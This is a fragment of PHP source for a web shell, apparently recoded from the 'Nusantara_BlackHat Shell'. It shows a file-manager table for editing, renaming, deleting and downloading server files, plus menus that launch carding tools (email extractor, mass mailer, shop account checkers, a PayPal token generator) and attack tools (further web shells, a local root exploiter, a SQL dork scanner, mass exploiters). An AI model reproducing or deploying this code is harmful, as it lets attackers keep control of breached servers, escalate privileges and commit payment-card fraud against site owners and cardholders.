            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAFa0lEQVR42qVWW2xUVRTde+6dufPqzDCddoZCkw40TYyooS0iIRr90S+jhBgTP0w0UT4kEhP84EeNQSWQqMRgjQICXyiPBEMMhYC2GCWIAlEendJ3O6923u87d+52n9NKCMES4k1O5t5zz93r7LXW3mcQ5q9NPDbzCMCDX2Ue3/H4gId+90sUwdevX9+3f/9+WN7ejgvztPDu7vs7n+VvLpuFbdu20cGDB/fy85v3AvhraGhoVZPPT9Wa/sAAqqpAwOel9vblRiqV8vNc8W6AWLlcDmYKJajrOuRyOVAUZT4SERiGAVarFUzTBFVV5bOYF8Pn84HVZoNmnxfWPr4Grl69GubPJu4FECpVa1TIFzAWi4HD6SBd15Ev0Gs1crnd2ODAFosC9bpODCIz6OgIo2bXwOt205o1vcgAHf8JoBsNisfjGI/HQFVUqnMQn9cL5UqFODMZSCznnRPTguVyhVpbW7GtrQ1cDgf19vYsChA0mdHJqUlIJpNgNkxwuVxQ02vAmYCnyQONRkPSZNI8VQ67Azo7O2UQu2aDnp6exSni/Ck6E2WKooJzKhaL2MSB+R15PE1Yr9ehVCqD3a5RrVbDJ9atI1wQX6zv6e5enCJFVWl2dhbHxsY4iF0GWRFeAc2B5kVdJCZURaHu+wAEVXYK2wymp6c5GQvYFpzDQOD3N0MqnZK0lYolsCgWUFjwYDAILa0t0nXdq1cvTpHNZqNUOo1pBnE6nZyBjjprYNM0IpMkRUwPu6hOPIfsJPZ+O1pZD+HaBRd1cbzhe2agaRqkMxlIJBKiAKT3DRbW5XSysCRFtvOafKEgRa5Vq1B2A1xM3oRsOQ9ffbwbooPX8qCbfRzzQx6V2wClUikkeE+LDNJpEUx6XdSBgy3IVGE+nwe32y0FjSTH8dvxH6l9WTuuCoTBqWoUK6Xw/Mhl6O87QsWzE5c57rM8UhKAHRNyMC3RmRlkoaXXRaGJrKpcaCwiiqrljXC6s7Rn+nt8amU3WS2IKz1h3iVSRs/gXDUL0VKaDu05gLOHI2c49nMSoFAohFhAinGh3Roelrw7HQ4UNcCCE2eEVaZEiLx7ah8tWeJCu4KkWgjfX/sRqKjSQPQcnpk4DXUTaTyfwJNbj1PlRv5FCZDL54NNnH40GpUuEjsXnLPYsvC6urogFArB0GwEtl54B5Y6vWChOqgWEz5/+jD/WqF/4ij8MHIY9IYFUNFgsP8SRHYNHZMAmWw25PV4iAXGSCQCwlFCH+YfWBNieqQePydOw6+Nk/TCio24sXOTXKMpmqyNBjXQMA1omAZtGdyAY7EUnHv18qgEmEulQ/4lPspkMrLZCSGZGmFFWXSCIsH/T8kT8Kd5jJ4Pv8IA75JEne+6t+8Ns05vD6zFRE6H4xuuxSRAPDkXbA34IcuHhyi2SqUCHo8HBO8iCzaBtO3ArRNwxf4NPBJ4FB5reRKsFoLVLW+xyAokyr/DVPEC1BoEJ0b3wPiwAUdfH/tDAkxH46G2UKtsFSIYA8hNiYoW4vPuUQAkUzE4bW4mtz2LXptBblsDX+6cAAtqdCPzGV5K7oS8rlK2pmL/3gL88nX6EwkwOjkd6ljeRiwojo6OcmvwE/uem12TsKakKxAIgJfb96nruyjjPoABO5BXM/CZZRFABpgsfIHX059CpqbQyKSBO15KlCo58yF5ZJ4dOP/wOj6RRNu93yWa4ZXUdvCFfoMWRxO4rQ3uSwQ1wwJMO/w9FoP3XkvC1E3jDV6+Tx763T29fdt37ISlbW33P5O570SjM5jInqKOzosYXjYHLs2k6yMVPHJsFg59WS4VsrRFBIc7Pvw/f1vMhTgzPET1il409e/LfwBGMiRx8YbaeAAAAABJRU5ErkJggg=='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
            echo "</tr>";
        }
      echo "</table>";
        if(!is_readable($dir)) {

        } else {
echo "<center><hr color=deepskyblue>
<form>
<select onchange='if (this.value) window.open(this.value);'>
<option selected='selected' value=''>Carder Tools</option>
<option value='$ling=extractor'>DB Email Extractor</option>
<option value='$ling=promailerv2'>Pro Mailer V2</option>     
<option value='$ling=bukalapak'>BukaLapak Checker</option>        
<option value='$ling=tokped'>TokoPedia Checker</option>  
<option value='$ling=tokenpp'>Paypal Token Generator</option>  
<option value='$ling=mailer'>Mailer</option>
</select>
<noscript><input type='submit' value='Submit'></noscript>
<select onchange='if (this.value) window.open(this.value);'>
<option selected='selected' value=''>Create Tools</option>
<option value='$ling=wso404'>WSO 404 Shell</option>
<option value='$ling=blackhat'>Blackhat Shell</option>
<option value='$ling=noname'>Noname Shell</option>
<option value='$ling=berandal'>Berandal Shell</option>
<option value='$ling=rootex'>Local Root Exploiter (No-Backconnect)</option>
<option value='$ling=sqlscan'>SQL Scanner (Bing Dorker)</option>
<option value='$ling=symconf'>Symlink Config v2</option>
<option value='$ling=webdav'>Webdav Mass Exploiter</option>
<option value='$ling=shellshock'>Shell Shock Scanner</option>
<option value='$ling=webconsole'>Web Console</option>
<option value='$ling=iptrack'>IP Tracker</option>
<option value='$ling=lokmed'>Lokmed Auto Exploiter</option>
</select>
<noscript><input type='submit' value='Submit'></noscript>
</form>
</center>";
    }
echo "<center>Copyright &copy; ".date("Y")." <a href='https://instagram.com/x_barakuda' target='_blank'><font color=deepskyblue>".$gue."</a></font><font color=red> #</font><font color=white> Recoded From </font><font color=deepskyblue>Nusantara_BlackHat Shell</font></center>";
}
?>
</body>
</html>